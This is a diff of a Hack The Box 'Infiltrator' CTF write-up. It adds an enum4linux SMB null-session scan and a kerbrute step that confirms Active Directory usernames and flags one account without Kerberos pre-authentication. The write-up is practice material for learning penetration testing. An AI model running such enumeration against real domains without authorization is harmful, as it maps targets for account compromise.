@@ -99,7 +99,140 @@ EOF
 
 ## 2. Exploring
 
-### 2.1. `80`
+### 2.1. `445`
+
+Attempting to check for low hanging fruit using `enum4linux` with empty username/password (not successful)
+
+```console
+root@kali:~# enum4linux infiltrator.htb
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Dec 22 15:38:39 2024
+
+ =========================================( Target Information )=========================================
+
+Target ........... infiltrator.htb
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ==========================( Enumerating Workgroup/Domain on infiltrator.htb )==========================
+
+
+[E] Can't find workgroup/domain
+
+
+
+ ==============================( Nbtstat Information for infiltrator.htb )==============================
+
+Looking up status of 10.10.11.31
+No reply from 10.10.11.31
+
+ ==================================( Session Check on infiltrator.htb )==================================
+
+
+[+] Server infiltrator.htb allows sessions using username '', password ''
+
+
+ ===============================( Getting domain SID for infiltrator.htb )===============================
+
+Domain Name: INFILTRATOR
+Domain Sid: S-1-5-21-2606098828-3734741516-3625406802
+
+[+] Host is part of a domain (not a workgroup)
+
+
+ =================================( OS information on infiltrator.htb )=================================
+
+
+[E] Can't get OS info with smbclient
+
+
+[+] Got OS info for infiltrator.htb from srvinfo:
+do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+
+ ======================================( Users on infiltrator.htb )======================================
+
+
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+
+
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+
+ ================================( Share Enumeration on infiltrator.htb )================================
+
+do_connect: Connection to infiltrator.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on infiltrator.htb
+
+
+ ==========================( Password Policy Information for infiltrator.htb )==========================
+
+
+[E] Unexpected error from polenum:
+
+
+
+[+] Attaching to infiltrator.htb using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+        [!] Protocol failed: Cannot request session (Called Name:INFILTRATOR.HTB)
+
+[+] Trying protocol 445/SMB...
+
+        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+
+
+[E] Failed to get password policy with rpcclient
+
+
+
+ =====================================( Groups on infiltrator.htb )=====================================
+
+
+[+] Getting builtin groups:
+
+
+[+]  Getting builtin group memberships:
+
+
+[+]  Getting local groups:
+
+
+[+]  Getting local group memberships:
+
+
+[+]  Getting domain groups:
+
+
+[+]  Getting domain group memberships:
+
+
+ =================( Users on infiltrator.htb via RID cycling (RIDS: 500-550,1000-1050) )=================
+
+
+[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+
+
+ ==============================( Getting printer info for infiltrator.htb )==============================
+
+do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Sun Dec 22 15:39:01 2024
+```
+
+### 2.2. `80`
 
 ![image](https://github.com/user-attachments/assets/52414a74-6fa4-4332-8f07-5d017347b690)
 
@@ -107,7 +240,7 @@ Some names are found on the site, enclosed in `<h4>` tags in the html code:
 
 ![image](https://github.com/user-attachments/assets/af363b97-7fd6-490e-be43-818cf37285f1)
 
-### 2.2. Parsing and extracting names
+### 2.3. Parsing and extracting names
 
 Let's parse the html for `xpath`: `//div/div/h4`
 
@@ -164,7 +297,7 @@ awk -F'>|<' '{print substr($3,5)}' raw.txt > names.txt
 
 </details>
 
-### 2.3. Generate possible usernames
+### 2.4. Generate possible usernames
 
 ```sh
 awk ' 
@@ -236,4 +369,28 @@ ethan.rodriguez@infiltrator.htb
 ethan_rodriguez@infiltrator.htb
 e.rodriguez@infiltrator.htb
 e_rodriguez@infiltrator.htb
+```
+
+## 3. Enumerate users with kerbrute
+
+```console
+root@kali:~# pipx install kerbrute
+  installed package kerbrute 0.0.2, installed using Python 3.12.8
+  These apps are now globally available
+    - kerbrute
+⚠️  Note: '/root/.local/bin' is not on your PATH environment variable. These apps will not be globally accessible until your PATH is updated. Run `pipx ensurepath` to automatically add it, or manually
+    modify your PATH in your shell's config file (e.g. ~/.bashrc).
+done! ✨ 🌟 ✨
+
+root@kali:~# /root/.local/bin/kerbrute -users usernames.txt -domain infiltrator.htb
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Valid user => d.anderson@infiltrator.htb
+[*] Valid user => o.martinez@infiltrator.htb
+[*] Valid user => k.turner@infiltrator.htb
+[*] Valid user => a.walker@infiltrator.htb
+[*] Valid user => m.harris@infiltrator.htb
+[*] Valid user => l.clark@infiltrator.htb [NOT PREAUTH]
+[*] Valid user => e.rodriguez@infiltrator.htb
+[*] No passwords were discovered :'(
 ```
